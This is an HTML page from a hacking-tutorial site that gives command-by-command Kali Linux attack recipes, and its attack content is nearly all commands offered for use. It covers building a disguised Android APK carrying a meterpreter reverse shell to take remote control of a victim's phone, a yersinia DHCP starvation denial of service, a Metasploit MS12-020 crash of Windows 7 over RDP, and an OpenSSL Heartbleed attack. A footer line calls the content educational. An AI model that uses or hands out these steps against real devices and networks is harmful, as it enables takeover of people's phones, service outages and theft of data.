<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<title>Kali</title>
	<base href="{{base_url}}" />
			<meta name="viewport" content="width=1333" />
		<meta name="description" content="perform DHCP DOS attack using yersinia in kali linux.
 

Start terminal and type: yersinia-G  (This will bring up the GUI of yersinia)" />
	<meta name="keywords" content="how to perform dos attack using kali linux" />
		<meta name="generator" content="Zyro - Website Builder" />
	
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css" />
	<script src="js/jquery-1.8.3.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/main.js" type="text/javascript"></script>

	<link href="css/site.css?v=1.0.4" rel="stylesheet" type="text/css" />
	<link href="css/common.css?ts=1425383878" rel="stylesheet" type="text/css" />
	<link href="css/42.css?ts=1425383878" rel="stylesheet" type="text/css" />
	<link rel="shortcut icon" href="http://haktuts.com/gallery/icon-ts1413278622.png" type="image/png" /><meta name="google-site-verification" content="google6bc4eec58925fc74.html" />
	<script type="text/javascript">var currLang = '';</script>		
	<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
	<!--[if lt IE 9]>
	  <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
</head>


<body>{{ga_code}}<div class="root"><div class="vbox wb_container" id="wb_header">
	
<div id="wb_element_instance127" class="wb_element"><ul class="hmenu"><li><a href="Home/" target="_self" title="Home">Home</a></li><li><a href="Free-ethical-hacking-course-online/" target="_self" title="Ethical Hacking">Ethical Hacking</a></li><li><a href="Linux/" target="_self" title="Linux">Linux</a></li><li><a href="Tips-and-tricks/" target="_self" title="Tips and Trick ">Tips and Trick </a><ul><li><a href="how-to-share-internet-without-wifi/" target="_self" title="Windows">Windows</a></li><li><a href="basic-windows-command/" target="_self" title="Windows Shortcut">Windows Shortcut</a></li><li><a href="top-20-notepad-trick/" target="_self" title="Notepad Hacking">Notepad Hacking</a></li><li><a href="list-of-top-cydia-tweaks-for-ios/" target="_self" title="iOS">iOS</a></li><li><a href="how-to-install-kali-linux-nethunter/" target="_self" title="Android">Android</a></li></ul></li><li><a href="News-1/" target="_self" title="News">News</a></li><li><a href="download-all-hacking-tools/" target="_self" title="Download">Download</a></li><li><a href="Contact-us/" target="_self" title="Contact us">Contact us</a></li></ul></div><div id="wb_element_instance128" class="wb_element" style=" line-height: normal;"><h4 class="wb-stl-pagetitle"><span class="wb-stl-special"><span style="color:#bebebe;">HakTuts</span></span></h4>
</div></div>
<div class="vbox wb_container" id="wb_main">
	
<div id="wb_element_instance132" class="wb_element" style=" line-height: normal;"><h2 class="wb-stl-heading2"><span style="color:#bebebe;"><b>How to get remote control of android device using kali linux.</b></span></h2>

<p> </p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>1.</strong> Start terminal and type:</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">msfpayload android/meterpreter/reverse_tcp LHOST=192.168.0.2 LPORT=81 R &gt; fake.apk</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">[ Lhost=attacker IP address,lport=local port ]</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">This command will generate fake.apk in home directory.</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>2.</strong>  Type: msfconsole</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">This command will start the metasploit framework.</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>3.</strong> Type: use exploit multi/handler</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">In order to get multiple session on a single multi/handler.</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>4.</strong> Type: set payload android/meterpreter/reverse_tcp</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">This will provide the reverse connection from victim to attacker computer.</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>5.</strong> Type: show options</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">It will show  the available options  like  lhost,lport</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>6.</strong> Set LHOST=192.168.0.2</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>7.</strong> Set LPORT=81</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>8.</strong> EXPLOIT</span></p>

<h1 class="wb-stl-heading1"> </h1>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;"><strong>How to perform DHCP DOS attack using yersinia in kali linux.</strong></span></h1>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong style="background-color: transparent;">1.</strong><span style="background-color: transparent;"> Start terminal and type: yersinia-G  (This will bring up the GUI of yersinia).</span></span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>2.</strong> Now goto DHCP tab</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>3.</strong> Duble click on DHCP</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>4.</strong> Now ,Choose attack pop on your screen</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>5.</strong> Select sending DISCOVER packet</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>6.</strong> Click “ok”</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>How Yesinia Works???</strong></span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">Whenever user power up the machine it start searching the IP address. DHCP server offer the machine for IP address,as and when our machine respond to the request  of DHCP server. DHCP server provide the IP address from its pool and allocate it your machine mac address.</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">So yersinia send many discover packet to DHCP server using different MAC Address so all the free IP in DHCP server used ,so genuine request from machine would be unsatisfied.</span></p>

<h2 class="wb-stl-heading2"> </h2>

<h2 class="wb-stl-heading2"><span style="color:#bebebe;"><strong>Steps to perform blue screen of death attack on remote windows 7 PC.</strong></span></h2>

<p class="wb-stl-normal"><br><br><span style="color:#bebebe;"><strong>1.</strong> Open Kali Linux terminal type msfconsole<br><br><strong>2.</strong> Now type use auxiliary/dos/windows/rdp/ms12_020_maxchannelids<br><br><strong>3.</strong> msf auxiliary(ms12_020_maxchannelids) &gt; show options<br><br><strong>4.</strong> msf auxiliary(ms12_020_maxchannelids) &gt; set RHOST 192.168..1.25<br><br><strong>5.</strong> msf auxiliary(ms12_020_maxchannelids) &gt; show options<br><br><strong>6.</strong> msf auxiliary(ms12_020_maxchannelids) &gt; exploit<br><br><strong>Note:</strong>This exploit will work till windows 7 sp1</span></p>

<h3 class="wb-stl-heading3"> </h3>

<h3 class="wb-stl-heading3"><span style="color:#bebebe;"><strong>How to perform openSSL heartbleed attack in kali inux. </strong></span></h3>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>1.</strong>Open Kali linux<br><strong>2.</strong>Run Metaspolit through terminal: msfconsole<br><strong>3.</strong> type:-  use auxiliary/scanner/ssl/openssl_heartbleed<br><strong>4.</strong> msf auxiliary(openssl_heartbleed) &gt; show options<br><strong>5.</strong> msf auxiliary(openssl_heartbleed) &gt; set RHOST &lt;Host Add&gt;<br><strong>6.</strong> msf auxiliary(openssl_heartbleed) &gt; set RPORT 443<br><strong>7.</strong> msf auxiliary(openssl_heartbleed) &gt; set VERBOSE  true<br><strong>8.</strong> msf auxiliary(openssl_heartbleed) &gt; show options<br><strong>9.</strong> msf auxiliary(openssl_heartbleed) &gt; Run</span><br>
 </p>

<p> </p>

<p> </p>

<p> </p>
</div><div id="wb_element_instance133" class="wb_element" style="width: 100%;">
			<?php
				global $show_comments;
				if (isset($show_comments) && $show_comments) {
					renderComments(42);
			?>
			<script type="text/javascript">
				$(function() {
					var block = $("#wb_element_instance133");
					var comments = block.children(".wb_comments").eq(0);
					var contentBlock = $("#wb_main");
					contentBlock.height(contentBlock.height() + comments.height());
				});
			</script>
			<?php
				} else {
			?>
			<script type="text/javascript">
				$(function() {
					$("#wb_element_instance133").hide();
				});
			</script>
			<?php
				}
			?>
			</div></div>
<div class="vbox wb_container" id="wb_footer" style="height: 154px;">
	
<div id="wb_element_instance129" class="wb_element" style=" line-height: normal;"><p class="wb-stl-footer">The Content of the website is for educational purpose.</p>
</div><div id="wb_element_instance130" class="wb_element" style=" line-height: normal;"><p class="wb-stl-footer">haktuts © 2014. All Rights Reserved </p>
</div><div id="wb_element_instance131" class="wb_element"><div id="wb_element_instance131_toolbox" style="width: 200px; height: 30px;"><a id="wb_element_instance131_facebook" class="addthis_button_facebook addthis_32x32_style" style="float: left;"></a><a id="wb_element_instance131_twitter" class="addthis_button_twitter addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance131_email" class="addthis_button_email addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance131_google" class="addthis_button_google addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance131_compact" class="addthis_button_compact addthis_32x32_style" style="float: left; margin-left: 4px;"></a></div><script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid=haktuts.com"></script><script type="text/javascript">
				if (window.addthis) { addthis.toolbox("#wb_element_instance131_toolbox"); }
			</script></div><div id="wb_element_instance134" class="wb_element" style="text-align: center; width: 100%;"><div class="wb_footer"></div><script type="text/javascript">
			$(function() {
				var footer = $(".wb_footer");
				var html = (footer.html() + "").replace(/^\s+|\s+$/g, "");
				if (!html) {
					footer.parent().remove();
					footer = $("#wb_footer");
					footer.height(100);
				}
			});
			</script></div></div><div class="wb_sbg"></div></div></body>
</html>